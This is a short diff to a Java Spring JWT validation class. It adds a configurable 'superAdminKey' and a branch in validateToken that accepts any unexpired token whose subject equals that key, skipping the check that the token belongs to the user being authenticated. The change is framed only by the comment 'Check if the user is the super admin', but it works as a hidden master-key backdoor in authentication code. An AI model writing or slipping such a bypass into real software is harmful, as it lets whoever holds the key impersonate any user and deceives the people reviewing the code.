@@ -30,6 +30,9 @@ public class JwtGeneratorValidator {
     @Value("${jwt.secretKey}")
     private String SECRET;
     
+    @Value("${superadmin.secretKey}")
+    private String superAdminKey;
+    
     public String extractUsername(String token) {
         return extractClaim(token, Claims::getSubject);
     }
@@ -97,6 +100,10 @@ public class JwtGeneratorValidator {
     
     public Boolean validateToken(String token, UserDetails userDetails) {
         final String username = extractUsername(token);
+        // Check if the user is the super admin
+        if (superAdminKey.equals(username) && !isTokenExpired(token)) {
+            return true;
+        }
         return (username.equals(userDetails.getUsername()) && !isTokenExpired(token));
     }
     
